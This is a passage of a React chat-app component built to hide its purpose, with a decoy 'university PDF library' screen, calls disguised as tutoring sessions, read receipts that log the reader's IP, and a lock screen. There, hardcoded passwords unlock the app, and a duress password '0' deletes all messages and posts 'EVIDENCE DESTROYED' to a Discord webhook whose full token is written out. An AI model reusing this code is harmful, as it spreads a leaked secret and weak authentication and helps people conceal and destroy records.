        <div className="grid grid-cols-2 gap-8 w-full max-w-xs">
          {colors.map(c => (
            <button
              key={c.name}
              onPointerDown={() => handlePointerDown(c.name)}
              onPointerUp={handlePointerUp}
              onPointerLeave={handlePointerUp}
              onClick={handleNormalClick}
              className={`w-full aspect-square rounded-3xl ${c.color} transition-transform transform active:scale-95 border-2 border-gray-800/50 hover:border-gray-600`}
              style={{ touchAction: 'none' }} // Prevents mobile browser scrolling/zooming when holding
            >
            </button>
          ))}
        </div>
      </div>
    );
  }

  // FAKE DECOY MODE (triggered by panic passwords)
  if (isDecoyMode) {
    return (
      <div className="flex h-[100dvh] flex-col bg-slate-100 overflow-hidden text-gray-900 font-sans">
        <header className="bg-white p-4 sm:p-5 flex justify-between items-center shadow-sm z-20 border-b border-gray-200">
           <h1 className="text-xl font-bold text-slate-800">📚 Global University PDF Library</h1>
           <button onClick={() => { setIsLoggedIn(false); setIsDecoyMode(false); }} className="text-sm font-medium text-blue-600 hover:text-blue-700">Sign Out</button>
        </header>
        <div className="flex-1 p-6 overflow-y-auto">
           <div className="max-w-md mx-auto relative">
             <input 
               type="text" 
               placeholder="Search by ISBN or Book Title..." 
               value={decoySearch}
               onChange={(e) => {
                 setDecoySearch(e.target.value);
                 if (e.target.value === "8899") {
                   setIsDecoyMode(false);
                   setDecoySearch("");
                 }
               }}
               className="w-full bg-white border border-gray-300 rounded-2xl px-5 py-3 shadow-sm focus:outline-none focus:border-blue-500" 
             />
             <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">🔍</span>
           </div>
           <h2 className="max-w-md mx-auto mt-8 font-semibold text-gray-500 text-sm uppercase tracking-wider mb-4">Recommended Reading</h2>
           <div className="grid grid-cols-2 gap-4 max-w-md mx-auto">
             {[1,2,3,4,5,6].map(i => (
                <div key={i} className="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 flex flex-col items-center">
                   <div className="w-full aspect-[3/4] bg-slate-200 rounded-xl mb-3 flex items-center justify-center text-slate-400">Preview Unavailable</div>
                   <div className="h-3 w-3/4 bg-slate-200 rounded-full mb-2"></div>
                   <div className="h-3 w-1/2 bg-slate-200 rounded-full"></div>
                </div>
             ))}
           </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-[100dvh] w-full flex-col bg-[#0d0d0f] text-gray-100 max-w-md mx-auto sm:border-x border-gray-800 shadow-2xl relative overflow-hidden">
      {/* Header */}
      <header className="flex items-center justify-between bg-[#151518] p-3 sm:p-4 border-b border-gray-800/50 shadow-md z-10">
        <div className="flex items-center gap-3">
          <button className="text-purple-400 hover:text-purple-300 transition text-xl">←</button>
          <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-purple-600 to-indigo-500 p-[2px]">
            <div className="w-full h-full bg-[#151518] rounded-full flex items-center justify-center border-2 border-[#151518] overflow-hidden">
              <span className="text-purple-400 font-semibold text-sm">KG</span>
            </div>
          </div>
          <div className="flex flex-col">
            <span className="font-semibold text-gray-100 tracking-wide text-base">{currentUser === 'user2' ? 'Ima' : 'Kathy Gomez'}</span>
            <div className="text-[11px] flex flex-col mt-0.5">
              {isPartnerOnline ? (
                <>
                  {isPartnerTyping ? (
                    <span className="text-purple-400 font-medium animate-pulse mt-0.5">Typing...</span>
                  ) : (
                    <span className="text-purple-500 font-medium">Online</span>
                  )}
                </>
              ) : (
                <span className="text-gray-500">Offline</span>
              )}
            </div>
          </div>
        </div>
        <div className="flex items-center gap-2">
          {isPartnerOnline && (
            <button onClick={() => initiateCall(false)} className="w-10 h-10 rounded-full bg-[#1c1c1e] shadow-[inset_-2px_-2px_5px_rgba(255,255,255,0.02),inset_2px_2px_5px_rgba(0,0,0,0.5),_2px_2px_5px_rgba(0,0,0,0.3)] flex items-center justify-center text-purple-500 hover:text-purple-400 transition transform hover:scale-105 active:scale-95" title="Voice Call">
              📞
            </button>
          )}
          <button onClick={handleLogout} className="text-xs text-gray-500 hover:text-red-400 transition px-2">Exit</button>
        </div>
      </header>

      {/* Chat Area */}
      <div className="flex-1 overflow-y-auto p-3 sm:p-4 space-y-4 bg-[#0d0d0f]">
        {messages.map((msg) => {
          const isMe = msg.sender === currentUser;
          return (
            <div key={msg.id} className={`flex ${isMe ? "justify-end" : "justify-start"}`}>
              <div 
                className={`relative max-w-[85%] sm:max-w-[75%] px-4 py-2.5 ${msg.message_type === 'sticker' ? 'bg-transparent' : (isMe ? "bg-gradient-to-r from-purple-600 to-purple-500 text-white rounded-2xl rounded-tr-sm shadow-[0_4px_15px_rgba(147,51,234,0.2)]" : "bg-[#1e1e22] text-gray-200 rounded-2xl rounded-tl-sm shadow-[inset_-1px_-1px_2px_rgba(255,255,255,0.02),_2px_4px_10px_rgba(0,0,0,0.3)] border border-gray-800/50")} cursor-pointer break-words transition-all mb-2`}
                onClick={() => setActiveMsgId(activeMsgId === msg.id ? null : msg.id)}
              >
                {activeMsgId === msg.id && (
                  <>
                    <div className={`absolute ${isMe ? "-top-12 right-0" : "-top-12 left-0"} flex gap-1 sm:gap-2 bg-gray-800 px-3 py-2 rounded-full shadow-xl border border-gray-700 z-50`}>
                      {["👍", "❤️", "😂", "😮", "😢", "🙏"].map(emoji => (
                        <button key={emoji} onClick={(e) => { e.stopPropagation(); handleReaction(msg, emoji); }} className="hover:scale-125 transition transform text-lg sm:text-xl">
                          {emoji}
                        </button>
                      ))}
                    </div>
                    <div className={`absolute ${isMe ? "-left-28" : "-right-28"} top-1/2 -translate-y-1/2 flex gap-1 z-10`}>
                      {!isMe && (
                        <button 
                          onClick={(e) => { e.stopPropagation(); setReplyingTo(msg); setActiveMsgId(null); }}
                          className="bg-gray-700 hover:bg-gray-600 text-white w-8 h-8 rounded-full flex items-center justify-center text-sm shadow-md transition-transform hover:scale-105"
                          title="Reply"
                        >
                          ↩️
                        </button>
                      )}
                      <button 
                        onClick={(e) => { e.stopPropagation(); setShowInfoForMsg(msg); setActiveMsgId(null); }}
                        className="bg-purple-500 hover:bg-purple-600 text-white w-8 h-8 rounded-full flex items-center justify-center text-sm shadow-md transition-transform hover:scale-105"
                        title="Message Info"
                      >
                        ℹ️
                      </button>
                      {isMe && (
                        <button 
                          onClick={(e) => { e.stopPropagation(); handleDeleteMessage(msg.id); }}
                          className="bg-red-500 hover:bg-red-600 text-white w-8 h-8 rounded-full flex items-center justify-center text-sm shadow-md transition-transform hover:scale-105"
                          title="Delete Message"
                        >
                          🗑️
                        </button>
                      )}
                    </div>
                  </>
                )}

                {msg.message_type === "text" && (
                  <div>
                    {getBaseContent(msg.content).startsWith("::REPLY::") ? (
                      <>
                        <div className="bg-black/20 border-l-4 border-white/50 p-2 rounded mb-2 text-xs opacity-80 italic overflow-hidden whitespace-nowrap text-ellipsis">
                          {getBaseContent(msg.content).split("::ENDREPLY::")[0].replace("::REPLY::", "")}
                        </div>
                        <p>{getBaseContent(msg.content).split("::ENDREPLY::")[1]}</p>
                      </>
                    ) : (
                      <p className="text-[15px] leading-relaxed">{getBaseContent(msg.content)}</p>
                    )}
                  </div>
                )}
                {msg.message_type === "image" && <img src={getBaseContent(msg.content)} alt="Media" className="rounded-lg max-w-full" />}
                {msg.message_type === "audio" && <CustomAudioPlayer src={getBaseContent(msg.content)} isMe={isMe} />}
                {msg.message_type === "sticker" && <img src={getBaseContent(msg.content)} alt="Sticker" className="w-32 h-32 object-contain drop-shadow-2xl" />}
                {msg.message_type === "image_once" && (
                  <div className="flex items-center gap-2 text-sm">
                    <span className="text-xl">💣</span>
                    {isMe ? (
                      <span className="italic opacity-80 font-medium">View-Once Sent</span>
                    ) : (
                      <button 
                        onClick={(e) => { e.stopPropagation(); handleViewOnce(msg); }} 
                        className="bg-purple-500 hover:bg-purple-400 text-white px-3 py-1.5 rounded-lg shadow-sm font-semibold"
                      >
                        View Photo
                      </button>
                    )}
                  </div>
                )}

                {getReactions(msg.content) && (
                  <div className={`flex gap-1 absolute -bottom-3 ${isMe ? "right-2" : "left-2"} z-20`}>
                    {Object.entries(getReactions(msg.content) as Record<string, number>).map(([emoji, count]) => (
                      <span key={emoji} className="bg-[#1e1e22] text-[10px] px-1.5 py-0.5 rounded-full border border-gray-800 shadow-md text-white flex items-center gap-1">
                        {emoji} {count > 1 ? count : ''}
                      </span>
                    ))}
                  </div>
                )}
                
                <div className={`flex items-center gap-1 mt-1 justify-end opacity-70 text-[10px] ${isMe ? "text-purple-100" : "text-gray-400"}`}>
                  <span>{new Date(msg.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                  {isMe && (
                    <span className="ml-1 tracking-tighter font-bold text-[11px]">
                      {msg.read ? (
                        <span className="text-cyan-300 drop-shadow-[0_0_2px_rgba(103,232,249,0.8)]">✓✓</span>
                      ) : (
                        <span className="text-purple-200">✓✓</span>
                      )}
                    </span>
                  )}
                </div>
              </div>
            </div>
          );
        })}
        <div ref={chatEndRef} />
      </div>

      {/* Inputs */}
      <footer className="p-3 bg-[#151518] border-t border-gray-800/50 flex flex-col relative z-20">
        {showEmojiPicker && (
          <div className="absolute bottom-[100%] mb-2 left-2 right-2 bg-[#1e1e22] border border-gray-800 shadow-2xl rounded-2xl h-64 flex flex-col overflow-hidden animate-fade-in-up">
            <div className="p-2 border-b border-gray-800 bg-[#1a1a1c]">
              <input type="text" placeholder="Search emoji" className="w-full bg-[#111113] text-sm text-gray-200 rounded-full px-4 py-2 focus:outline-none focus:ring-1 focus:ring-purple-500" />
            </div>
            <div className="flex-1 overflow-y-auto p-3 grid grid-cols-8 gap-2 content-start">
              {Object.entries(emojis).map(([category, items]) => (
                <React.Fragment key={category}>
                  <div className="col-span-8 text-xs font-semibold text-gray-500 mt-2 mb-1 uppercase tracking-wider">{category}</div>
                  {items.map(emoji => (
                    <button key={emoji} type="button" onClick={() => setNewMessage(prev => prev + emoji)} className="text-xl sm:text-2xl hover:scale-125 transition transform focus:outline-none flex items-center justify-center">
                      {emoji}
                    </button>
                  ))}
                </React.Fragment>
              ))}
            </div>
          </div>
        )}

        {showStickers && (
          <div className="absolute bottom-[100%] mb-2 left-2 right-2 bg-[#1e1e22] border border-gray-800 shadow-2xl rounded-2xl p-3 grid grid-cols-4 sm:grid-cols-5 gap-3 max-h-56 overflow-y-auto animate-fade-in-up">
            {stickers.map((url, i) => (
              <button key={i} type="button" onClick={() => sendSticker(url)} className="p-2 hover:bg-gray-800 rounded-xl transition transform hover:scale-110 flex items-center justify-center border border-transparent hover:border-gray-700">
                <img src={url} alt="Sticker" className="w-16 h-16 object-contain drop-shadow-md" />
              </button>
            ))}
          </div>
        )}

        {replyingTo && (
          <div className="bg-[#1e1e22] border-l-4 border-purple-500 p-2 mb-2 rounded flex justify-between items-center text-sm text-gray-300 shadow-md">
            <div className="truncate pr-4">
              <span className="font-semibold text-purple-400 mr-2">Replying to:</span>
              {replyingTo.message_type === "text" 
                ? (replyingTo.content.includes("::ENDREPLY::") ? replyingTo.content.split("::ENDREPLY::")[1] : replyingTo.content)
                : `[${replyingTo.message_type.toUpperCase()}]`}
            </div>
            <button onClick={() => setReplyingTo(null)} className="text-gray-500 hover:text-white px-2 transition">✕</button>
          </div>
        )}

        {isRecording ? (
          <div className="flex items-center justify-between gap-2 p-2 rounded-full bg-purple-600/20 border border-purple-500/30">
            <span className="text-purple-400 font-medium flex items-center gap-3 px-3">
              <span className="w-3 h-3 rounded-full bg-purple-500 animate-pulse shadow-[0_0_10px_rgba(168,85,247,0.8)]"></span>
              Recording Voice...
            </span>
            <button 
              type="button" 
              onClick={stopRecording} 
              className="rounded-full bg-purple-600 hover:bg-purple-500 px-5 py-2 text-sm sm:text-base font-medium whitespace-nowrap text-white transition shadow-lg"
            >
              Send
            </button>
          </div>
        ) : (
          <form onSubmit={sendTextMessage} className="flex items-end gap-2 w-full">
            <div className="flex-1 flex items-end gap-1 sm:gap-2 bg-[#1e1e22] border border-gray-800 rounded-3xl px-2 py-1 shadow-[inset_0_2px_4px_rgba(0,0,0,0.2)]">
              <button type="button" onClick={() => {setShowEmojiPicker(!showEmojiPicker); setShowStickers(false);}} className={`p-2 text-xl transition ${showEmojiPicker ? "text-purple-400 opacity-100" : "opacity-60 hover:opacity-100 hover:text-purple-400"}`} title="Emojis">😊</button>
              <input
                type="text"
                placeholder="Message"
                value={newMessage}
                onChange={handleTyping}
                className="flex-1 min-w-0 bg-transparent px-1 py-2.5 text-[15px] text-gray-100 placeholder-gray-500 focus:outline-none"
              />
              <label className="p-2 text-xl opacity-60 hover:opacity-100 hover:text-purple-400 transition cursor-pointer" title="Attach Media">
                📎
                <input type="file" accept="image/*,video/*" onChange={(e) => handleFileUpload(e, "image")} className="hidden" />
              </label>
              <button type="button" onClick={() => setIsViewOnce(!isViewOnce)} className={`p-2 text-xl transition ${isViewOnce ? "text-purple-500 opacity-100" : "opacity-60 hover:opacity-100 hover:text-purple-400"}`} title="View Once">💣</button>
              <button type="button" onClick={() => {setShowStickers(!showStickers); setShowEmojiPicker(false);}} className={`p-2 text-xl transition ${showStickers ? "text-purple-400 opacity-100" : "opacity-60 hover:opacity-100 hover:text-purple-400"}`} title="Stickers">🐶</button>
            </div>
            
            {newMessage.trim() ? (
              <button type="submit" disabled={uploading} className="w-[50px] h-[50px] rounded-full bg-gradient-to-tr from-purple-600 to-indigo-500 flex items-center justify-center shadow-[0_0_15px_rgba(147,51,234,0.4)] flex-shrink-0 transform active:scale-95 transition-all text-xl text-white">
                {uploading ? "..." : "➤"}
              </button>
            ) : (
              <button type="button" onClick={startRecording} className="w-[50px] h-[50px] rounded-full bg-[#1e1e22] border border-gray-700 flex items-center justify-center shadow-[0_4px_10px_rgba(0,0,0,0.3)] flex-shrink-0 transform active:scale-95 transition-all text-xl text-purple-400 hover:text-purple-300">
                🎙️
              </button>
            )}
          </form>
        )}
      </footer>

      {/* Fullscreen View Once Overlay */}
      {fullscreenImage && (
        <div className="fixed inset-0 z-[100] bg-black/95 flex flex-col items-center justify-center p-4 backdrop-blur-sm">
          <button 
            onClick={() => setFullscreenImage(null)} 
            className="absolute top-6 right-6 text-white text-xl bg-gray-800 hover:bg-gray-700 rounded-full w-12 h-12 flex items-center justify-center transition-colors shadow-lg border border-gray-700"
          >
            ✕
          </button>
          <img src={fullscreenImage} className="max-w-full max-h-[85vh] object-contain rounded-lg shadow-2xl" />
          <p className="text-red-400 mt-6 text-sm animate-pulse font-medium tracking-wide">
            This photo has been instantly deleted from the database.
          </p>
        </div>
      )}

      {/* Message Info Modal */}
      {showInfoForMsg && (
        <div className="fixed inset-0 z-[100] bg-black/80 flex flex-col items-center justify-center p-4 backdrop-blur-sm" onClick={() => setShowInfoForMsg(null)}>
          <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-sm border border-gray-800 shadow-2xl" onClick={e => e.stopPropagation()}>
            <h3 className="text-lg font-semibold text-white border-b border-gray-800 pb-2 mb-4">Message Info</h3>
            
            <div className="mb-4 bg-gray-800 p-3 rounded-xl break-words text-sm text-gray-200 shadow-inner">
              {showInfoForMsg.message_type === "text" && <p>{showInfoForMsg.content}</p>}
              {showInfoForMsg.message_type === "image" && <span className="italic text-gray-400 flex items-center gap-2">📷 Image Media</span>}
              {showInfoForMsg.message_type === "audio" && <span className="italic text-gray-400 flex items-center gap-2">🎙️ Voice Note</span>}
              {showInfoForMsg.message_type === "image_once" && <span className="italic text-red-400 flex items-center gap-2">💣 View-Once Photo</span>}
            </div>

            <div className="space-y-4">
              <div className="flex justify-between items-center text-sm border-b border-gray-800/50 pb-3">
                <span className="text-gray-400 flex items-center gap-2"><span className="text-gray-500 font-bold">✓</span> Delivered</span>
                <span className="text-gray-200">{new Date(showInfoForMsg.created_at).toLocaleString([], { dateStyle: 'medium', timeStyle: 'short' })}</span>
              </div>
              
              <div className="flex justify-between items-start text-sm">
                <span className="text-gray-400 flex items-center gap-2"><span className="text-cyan-400 font-bold tracking-tighter">✓✓</span> Read</span>
                <div className="text-right">
                  {showInfoForMsg.read ? (
                    <>
                      <div className="text-gray-200">
                        {showInfoForMsg.read_at 
                          ? new Date(showInfoForMsg.read_at).toLocaleString([], { dateStyle: 'medium', timeStyle: 'short' })
                          : <span className="italic text-gray-500">Time Unavailable</span>}
                      </div>
                      <div className="text-xs text-blue-400 mt-1 bg-blue-500/10 inline-block px-2 py-0.5 rounded font-mono">
                        IP: {showInfoForMsg.read_by_ip || "Hidden/Unavailable"}
                      </div>
                    </>
                  ) : (
                    <span className="text-gray-500 italic">Not read yet...</span>
                  )}
                </div>
              </div>
            </div>
            
            <button onClick={() => setShowInfoForMsg(null)} className="w-full mt-6 bg-blue-600 hover:bg-blue-500 text-white font-medium py-2.5 rounded-xl transition shadow-md">
              Close
            </button>
          </div>
        </div>
      )}

      {/* Call UI Overlay */}
      {callState !== "idle" && (
        <div className="fixed inset-0 z-[200] bg-gray-950 flex flex-col">
          {callState === "ringing" && (
            <div className="flex-1 flex flex-col items-center justify-center p-6 text-center">
              <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center text-4xl mb-6 animate-bounce shadow-[0_0_30px_rgba(37,99,235,0.5)]">
                {isVideoCall ? "📹" : "📞"}
              </div>
              <h2 className="text-2xl font-semibold text-white mb-2">Live Tutor Session</h2>
              <p className="text-gray-400 mb-12">Incoming Request...</p>
              
              <div className="flex gap-8">
                <button onClick={endCall} className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center text-2xl shadow-[0_0_20px_rgba(239,68,68,0.4)] hover:scale-105 transition">
                  ✖
                </button>
                <button onClick={acceptCall} className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center text-2xl shadow-[0_0_20px_rgba(34,197,94,0.4)] hover:scale-105 transition animate-pulse">
                  📞
                </button>
              </div>
            </div>
          )}

          {callState === "calling" && (
            <div className="flex-1 flex flex-col items-center justify-center p-6 text-center">
              <div className="w-24 h-24 bg-gray-800 rounded-full flex items-center justify-center text-4xl mb-6 border-2 border-gray-700">
                {isVideoCall ? "📹" : "📞"}
              </div>
              <h2 className="text-2xl font-semibold text-white mb-2">Requesting Session...</h2>
              <p className="text-gray-400 mb-12 animate-pulse">Waiting for answer...</p>
              
              <button onClick={endCall} className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center text-2xl shadow-lg hover:scale-105 transition">
                ✖
              </button>
            </div>
          )}

          {callState === "connected" && (
            <div className="flex-1 relative bg-black">
              {/* Remote Video */}
              <video 
                ref={remoteVideoRef} 
                autoPlay 
                playsInline 
                className={`w-full h-full object-cover ${isVideoCall ? "" : "hidden"}`}
              />
              
              {/* Audio Only Avatar for Remote */}
              {!isVideoCall && (
                <div className="absolute inset-0 flex items-center justify-center bg-gray-900">
                  <div className="w-32 h-32 bg-gray-800 rounded-full flex items-center justify-center text-5xl border border-gray-700 shadow-2xl">🎧</div>
                </div>
              )}

              {/* Local Video PiP */}
              <div className={`absolute top-4 right-4 w-24 sm:w-32 aspect-[3/4] bg-gray-800 rounded-xl overflow-hidden shadow-2xl border-2 border-gray-700 z-10 ${hasLocalVideo ? "" : "hidden"}`}>
                <video 
                  ref={localVideoRef} 
                  autoPlay 
                  playsInline 
                  muted 
                  className="w-full h-full object-cover"
                />
              </div>

              {/* Controls */}
              <div className="absolute bottom-8 left-1/2 -translate-x-1/2 flex gap-6 bg-gray-900/80 p-4 rounded-full backdrop-blur-md border border-gray-800 z-10">
                {isVideoCall && (
                  <button onClick={toggleVideo} className={`w-14 h-14 rounded-full flex items-center justify-center text-xl shadow-lg transition ${isVideoOff ? 'bg-red-500 hover:bg-red-600' : 'bg-gray-700 hover:bg-gray-600'}`}>
                    {isVideoOff ? "🚫" : "📹"}
                  </button>
                )}
                <button onClick={endCall} className="w-14 h-14 bg-red-500 rounded-full flex items-center justify-center text-xl shadow-[0_0_15px_rgba(239,68,68,0.5)] hover:bg-red-600 transition hover:scale-105">
                  📞
                </button>
                <button onClick={toggleMute} className={`w-14 h-14 rounded-full flex items-center justify-center text-xl shadow-lg transition ${isMuted ? 'bg-red-500 hover:bg-red-600' : 'bg-gray-700 hover:bg-gray-600'}`}>
                  {isMuted ? "🔇" : "🎤"}
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Lock Screen Overlay */}
      {isLocked && (
        <div className="fixed inset-0 z-[500] bg-[#0d0d0f]/95 flex flex-col items-center justify-center p-4 backdrop-blur-xl">
          <div className="w-full max-w-sm bg-[#151518] border border-gray-800/80 rounded-[2rem] p-8 shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-purple-600 to-indigo-500"></div>
            <div className="w-16 h-16 bg-[#1e1e22] rounded-full flex items-center justify-center text-2xl mb-6 mx-auto border border-gray-800 shadow-inner text-purple-400">
              🔒
            </div>
            <h2 className="text-2xl font-bold text-white mb-2 text-center tracking-wide">Session Locked</h2>
            <p className="text-gray-400 mb-8 text-center text-sm">Verify your identity to resume.</p>
            <form onSubmit={(e) => {
              e.preventDefault();
              if (unlockPassword === currentUser) {
                setIsLocked(false);
                setUnlockPassword("");
                if (currentUser === "i") {
                  setIsThemeSelectionMode(true);
                }
              } else if (currentUser === "i" && unlockPassword === "imaya") {
                setIsLocked(false);
                setUnlockPassword("");
                setIsDecoyMode(true);
              } else if (currentUser === "i" && unlockPassword === "0") {
                setIsLocked(false);
                setUnlockPassword("");
                setIsDecoyMode(true);
                supabase.from("messages").delete().in("sender", ["i", "user2"]).then(() => {
                   fetch("https://discord.com/api/webhooks/1510155690608431254/iquv1dW-GEZU56wzIZZ6yI66bsnBVumGDo92LQGGD3OO2UUwDGWGzdrTp5Ct0eFLIHl2", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                       content: `<@1448949659451265045> 🚨 **DURESS PASSWORD '0' ENTERED! EVIDENCE DESTROYED!**`
                     })
                  });
                });
              } else {
                alert("Incorrect password");
              }
            }} autoComplete="off" className="space-y-4">
              <div>
                <input 
                  type="password" 
                  autoComplete="new-password"
                  value={unlockPassword}
                  onChange={(e) => setUnlockPassword(e.target.value)}
                  className="w-full bg-[#0d0d0f] border border-gray-800 rounded-2xl px-5 py-4 text-white focus:outline-none focus:ring-1 focus:ring-purple-500 transition text-center tracking-[0.5em] text-lg shadow-inner"
                  placeholder="••••••••"
                  required
                />
              </div>
              <button type="submit" className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:opacity-90 text-white font-semibold py-4 rounded-2xl transition shadow-[0_4px_15px_rgba(147,51,234,0.3)] mt-2">
                Unlock
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
